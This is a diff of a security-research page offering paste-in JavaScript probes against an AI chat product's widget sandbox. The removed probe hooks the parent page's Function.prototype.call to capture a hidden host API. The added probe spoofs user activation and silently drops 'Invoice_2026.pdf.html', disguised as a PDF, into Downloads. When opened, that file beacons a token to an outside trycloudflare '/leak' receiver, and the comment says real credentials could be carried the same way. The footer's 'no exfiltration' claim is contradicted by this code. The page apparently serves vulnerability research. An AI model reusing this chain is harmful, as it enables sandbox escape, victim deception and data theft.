@@ -18,93 +18,80 @@ footer { padding:12px 16px; color:#789; font-size:12px; border-top:1px solid #33
 </head>
 <body>
 <header>
-  <h1>T65-JE-STATE-INSTRUMENT - inert copy-paste canary (Pluto Security research)</h1>
+  <h1>T66-DROPPER-EXFIL - inert copy-paste canary (Pluto Security research)</h1>
   <button onclick="copyCode()">Copy code</button>
   <span class="note">then paste into the playground Output box and press Run</span>
 </header>
-<div id="wrap"><pre id="code">/* T65 - THE ONE UNKNOCKED DOOR: Je.updateWidgetState + Je.sendInstrument.
-   Handoff item 2. T56 captured the unfiltered host API (Je, 13 keys)
-   via a cross-realm Function.prototype.call hook but called NOTHING on
-   it (T57 tested only callMcp). This probe re-captures Je the same
-   proven way, restores the hook, then fires exactly TWO inert calls:
-   - Je.updateWidgetState({t65:&quot;canary-state&quot;, at:&lt;epoch&gt;})  (hidden;
-     T54 says statePersistence=&quot;none&quot; for our class -&gt; expect
-     rejection or no-op)
-   - Je.sendInstrument(&quot;t65-canary&quot;, {t65:1, at:&lt;epoch&gt;})     (telemetry;
-     expect accept-and-ignore - unreadable by the attacker either way)
-   Nothing else is called. Nothing is persisted intentionally. If
-   updateWidgetState RESOLVES, do not reload yet - report first (a
-   reload-persistence variant, T65b, follows only in that case). */
+<div id="wrap"><pre id="code">/* T66 - DROPPER-EXFIL CHAIN, INERT CANARY. Question: can the silently
+   dropped file finish the exfiltration - bypassing every warning that
+   gates the page itself?
+   Chain under test (research annex row 1, &quot;verified file:// leg&quot; now
+   tested END-TO-END on the real victim path):
+   1. spoofed activation (T11-proven) -&gt; anchor-click download through
+      the host&#x27;s own bootstrap interceptor (T29/T30-proven) -&gt; silent
+      zero-click write of &quot;Invoice_2026.pdf.html&quot; to ~/Downloads.
+      Finder hides the final extension by default -&gt; victim sees
+      &quot;Invoice_2026.pdf&quot;.
+   2. File content = INERT clearly-labeled canary page with the token
+      baked in AT WRITE TIME (same mechanism that would bake captured
+      credentials in a real attack).
+   3. The researcher double-clicks the file ONCE in Finder (the single
+      victim action). It opens as a file:// page - no CSP, no gates.
+      The page then beacons the token to the researcher&#x27;s OWN receiver
+      (fetch + img fallback) and logs results on-screen.
+   Ground truth = the receiver log. Nothing real is stolen. */
 (function () {
-  var d = document;
-  var box = d.createElement(&quot;div&quot;);
-  box.id = &quot;t65-box&quot;;
-  box.style.cssText = &quot;position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;max-height:50vh;overflow:auto;white-space:pre-wrap;word-break:break-all&quot;;
-  box.textContent = &quot;T65: hooking runner .call to capture Je...&quot;;
-  d.body.appendChild(box);
+  function log(m) { try { console.log(&quot;[T66] &quot; + m + &quot; @&quot; + Date.now()); } catch (e) {} }
+  var TOKEN = &quot;T66-&quot; + Date.now();
+  log(&quot;START dropper-exfil canary, token &quot; + TOKEN + &quot;, origin &quot; + location.origin);
 
-  function show(m) {
-    box.textContent = m;
-    try { console.log(m); } catch (e) {}
-  }
-  function dump(r) {
-    try {
-      if (r &amp;&amp; typeof r === &quot;object&quot;) {
-        var s = String(r);
-        var props = [];
-        for (var k in r) { try { props.push(k + &quot;=&quot; + String(r[k]).slice(0, 120)); } catch (e4) {} }
-        return s + (props.length ? &quot; {&quot; + props.join(&quot;, &quot;).slice(0, 400) + &quot;}&quot; : &quot;&quot;);
-      }
-      return String(r);
-    } catch (e) { return &quot;unprintable&quot;; }
-  }
-
-  var P = null;
-  try { P = window.parent; } catch (e) {}
-  if (!P || P === window) { show(&quot;T65: no accessible parent realm&quot;); return; }
-  var origCall;
-  try { origCall = P.Function.prototype.call; } catch (e) { show(&quot;T65: cannot read parent .call: &quot; + e); return; }
-  var captured = null;
+  /* --- spoof activation (T11-proven) --- */
   try {
-    P.Function.prototype.call = function (t) {
-      try {
-        if (!captured &amp;&amp; t &amp;&amp; typeof t === &quot;object&quot; &amp;&amp;
-            typeof t.callTool === &quot;function&quot; &amp;&amp;
-            typeof t.updateWidgetState === &quot;function&quot;) captured = t;
-      } catch (e2) {}
-      return origCall.apply(this, arguments);
-    };
-  } catch (e) { show(&quot;T65: hook write failed: &quot; + e); return; }
+    Object.defineProperty(navigator, &quot;userActivation&quot;, { get: function () { return { isActive: true }; } });
+    log(&quot;activation spoofed&quot;);
+  } catch (e) { log(&quot;spoof ERR &quot; + e.message); }
 
-  var api = window.oai || window.openai || window.webplus;
-  try { if (api &amp;&amp; api.notifyIntrinsicWidth) api.notifyIntrinsicWidth(window.innerWidth || 300); } catch (e) {}
-  try { if (api &amp;&amp; api.setWidgetState) api.setWidgetState({ t65: &quot;trigger&quot; }); } catch (e) {}
-  try { if (api &amp;&amp; api.callTool) api.callTool(&quot;t65-trigger&quot;); } catch (e) {}
+  /* --- the inert canary page that will be written to ~/Downloads --- */
+  var R = &quot;https://between-notified-postposted-classic.trycloudflare.com/leak?d=&quot;;
+  var html = [
+    &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;title&gt;Invoice_2026&lt;/title&gt;&lt;/head&gt;&quot;,
+    &quot;&lt;body style=\&quot;font:13px Menlo,monospace;background:#fff;color:#000;padding:18px\&quot;&gt;&quot;,
+    &quot;&lt;h3&gt;PLUTO SECURITY RESEARCH CANARY - INERT - NOTHING REAL&lt;/h3&gt;&quot;,
+    &quot;&lt;p&gt;This file was silently written to ~/Downloads from a chatgpt.com research payload.&lt;/p&gt;&quot;,
+    &quot;&lt;p&gt;Token: &quot; + TOKEN + &quot;&lt;/p&gt;&quot;,
+    &quot;&lt;pre id=\&quot;out\&quot;&gt;file:// page loaded... beacon pending&lt;/pre&gt;&quot;,
+    &quot;&lt;script&gt;&quot;,
+    &quot;var R = \&quot;&quot; + R + &quot;\&quot;;&quot;,
+    &quot;function log(m){ var o = document.getElementById(\&quot;out\&quot;); o.textContent += \&quot;\\n\&quot; + m; }&quot;,
+    &quot;log(\&quot;loaded as file:// page at \&quot; + Date.now());&quot;,
+    &quot;try {&quot;,
+    &quot;  fetch(R + \&quot;&quot; + TOKEN + &quot;-fetch-\&quot; + Date.now())&quot;,
+    &quot;    .then(function(r){ log(\&quot;FETCH BEACON SENT, status=\&quot; + r.status + \&quot; (exfil leg VERIFIED)\&quot;); })&quot;,
+    &quot;    .catch(function(e){ log(\&quot;fetch blocked: \&quot; + e.message); });&quot;,
+    &quot;} catch(e) { log(\&quot;fetch threw: \&quot; + e.message); }&quot;,
+    &quot;var i = new Image();&quot;,
+    &quot;i.onload = function(){ log(\&quot;IMG BEACON SENT (exfil leg VERIFIED)\&quot;); };&quot;,
+    &quot;i.onerror = function(){ log(\&quot;img beacon failed\&quot;); };&quot;,
+    &quot;i.src = R + \&quot;&quot; + TOKEN + &quot;-img-\&quot; + Date.now();&quot;,
+    &quot;&lt;\/script&gt;&lt;/body&gt;&lt;/html&gt;&quot;
+  ].join(&quot;&quot;);
 
-  setTimeout(function () {
-    try { P.Function.prototype.call = origCall; } catch (e) {}
-    if (!captured) { show(&quot;T65: Je NOT captured (no matching .call dispatch). Hook removed.&quot;); return; }
+  /* --- silent write via the host&#x27;s own download bootstrap (T29/T30-proven) --- */
+  try {
+    var blob = new Blob([html], { type: &quot;text/html&quot; });
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement(&quot;a&quot;);
+    a.href = url;
+    a.download = &quot;Invoice_2026.pdf.html&quot;;
+    a.style.display = &quot;none&quot;;
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function () { URL.revokeObjectURL(url); a.remove(); }, 4000);
+    log(&quot;WRITE FIRED: Invoice_2026.pdf.html (Finder shows Invoice_2026.pdf)&quot;);
+    log(&quot;NEXT: check ~/Downloads, then double-click the file ONCE in Finder&quot;);
+  } catch (e) { log(&quot;write ERR &quot; + e.message); }
 
-    var lines = [&quot;T65 Je captured (&quot; + Object.keys(captured).length + &quot; keys). Firing 2 inert calls...&quot;];
-
-    try {
-      var r1 = captured.updateWidgetState({ t65: &quot;canary-state&quot;, at: Date.now() });
-      if (r1 &amp;&amp; typeof r1.then === &quot;function&quot;) {
-        r1.then(function (v) { lines.push(&quot;updateWidgetState RESOLVED: &quot; + dump(v)); },
-                function (v) { lines.push(&quot;updateWidgetState REJECTED: &quot; + dump(v)); });
-      } else { lines.push(&quot;updateWidgetState returned (non-promise): &quot; + dump(r1)); }
-    } catch (e) { lines.push(&quot;updateWidgetState THREW: &quot; + (e &amp;&amp; e.message)); }
-
-    try {
-      var r2 = captured.sendInstrument(&quot;t65-canary&quot;, { t65: 1, at: Date.now() });
-      if (r2 &amp;&amp; typeof r2.then === &quot;function&quot;) {
-        r2.then(function (v) { lines.push(&quot;sendInstrument RESOLVED: &quot; + dump(v)); },
-                function (v) { lines.push(&quot;sendInstrument REJECTED: &quot; + dump(v)); });
-      } else { lines.push(&quot;sendInstrument returned (non-promise): &quot; + dump(r2)); }
-    } catch (e) { lines.push(&quot;sendInstrument THREW: &quot; + (e &amp;&amp; e.message)); }
-
-    setTimeout(function () { show(lines.join(&quot;\n&quot;)); }, 1200);
-  }, 1500);
+  log(&quot;DONE - watch ~/Downloads and the receiver log&quot;);
 })();
 </pre></div>
 <footer>inert research canary - inbound fetch control only, no exfiltration</footer>
